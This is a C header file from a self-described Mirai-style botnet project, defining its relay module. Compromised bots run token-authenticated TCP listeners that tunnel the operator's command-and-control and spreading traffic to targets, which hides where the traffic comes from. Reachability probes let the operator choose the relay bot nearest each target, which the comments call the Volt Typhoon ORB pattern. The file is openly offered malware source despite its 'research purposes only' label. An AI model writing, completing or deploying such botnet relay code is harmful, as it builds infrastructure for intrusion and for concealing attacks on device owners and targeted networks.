/*
 * notnet - Modern Mirai-Style Botnet
 * relay.h - ORB-style single-hop TCP relay (#91)
 *
 * Research purposes only.
 */
#ifndef NOTNET_RELAY_H
#define NOTNET_RELAY_H

#include "protocol.h"

/* ORB-style relay (#91) — the Volt Typhoon pattern.
 *
 * An operator routes C2/spread traffic through a chain of bots (TCP
 * CONNECT-style forwarding between peers) so operations no longer
 * originate from the bot's own IP. This module provides the two halves:
 *
 *   relay_start()/relay_stop()   — relay SERVER: a token-authenticated
 *     listener (pthread accept loop, like the SOCKS5 proxy) that accepts
 *     a one-line target spec and splices the connection to it:
 *
 *       client --RELAY req--> bot:relay_port --> target host:port
 *
 *     Handshake: the client sends one CRLF-terminated line
 *     `RELAY <token> <target_host> <target_port>`. The token is checked
 *     constant-time; on success the server replies `OK`, on failure
 *     `ERR <reason>` (BADREQ/AUTH/UNREACH), then raw bytes are tunneled
 *     bidirectionally with bounded buffers and select-bounded I/O.
 *
 *   relay_connect()/relay_probe() — relay CLIENT helpers: dial a target
 *     THROUGH a relay bot instead of directly (single hop). The same
 *     shared fleet relay_token authenticates both halves, mirroring the
 *     SOCKS5 proxy token pattern.
 *
 * Single-hop only in this version. Multi-hop chains compose by pointing
 * one hop's target at the next relay bot's listener; that wiring is
 * future work. This is explicitly NOT a DHT — there is no peer
 * discovery, no overlay, nothing to crawl or pollute (#88).
 *
 * Security posture (mirrors proxy.c):
 *  - Auth is mandatory and FAIL-CLOSED: relay_start() refuses to bind
 *    without a configured relay_token; token comparison is constant-time.
 *  - Every buffer is bounded (RELAY_HANDSHAKE_MAX / RELAY_BUF_SIZE),
 *    handshake/tunnel I/O is time-bounded via select(), and each
 *    send/recv return is checked.
 *  - IPv4 and domain targets; IPv6 targets are rejected by the connect
 *    helper (AF_INET only).
 *  - The token is held in memory only; it is never logged or written out.
 *
 * Returns 0 on success, -1 on failure (token unset, bind failed, thread
 * spawn failed). relay_start() on an already-running relay is a no-op
 * returning 0. */
int relay_start(notnet_bot_t *bot);
void relay_stop(void);

/* Report current state (1 = accept loop running / 0 = stopped) and the
 * actual bound port (0 when not running). Used by the heartbeat so the
 * C2 can build a relay inventory for per-target relay selection. */
int relay_is_running(void);
int relay_get_port(void);

/* Relay client helper (#91): dial target_host:target_port THROUGH the
 * relay bot at via_host:via_port (single hop). Authenticates with
 * bot->relay_token (fail-closed when unset), sends the target spec, and
 * waits for the relay's OK. Returns a connected, tunnel-ready socket fd
 * on success (the caller owns it and must close it), or -1 on any
 * failure. */
int relay_connect(notnet_bot_t *bot, const char *via_host, uint16_t via_port,
                  const char *target_host, uint16_t target_port);

/* Per-target reachability probe: connect to target_host:target_port,
 * either directly (via_host NULL/empty) or routed through the relay bot
 * at via_host:via_port. On success *rtt_ms (may be NULL) receives the
 * connect round-trip in milliseconds. Returns 0 on success, -1 on
 * failure. This is the building block for per-target relay selection —
 * the C2 operator probes candidate relays and prefers the one closest to
 * the target (the ORB pattern). */
int relay_probe(notnet_bot_t *bot, const char *target_host, uint16_t target_port,
                const char *via_host, uint16_t via_port, long *rtt_ms);

#endif /* NOTNET_RELAY_H */
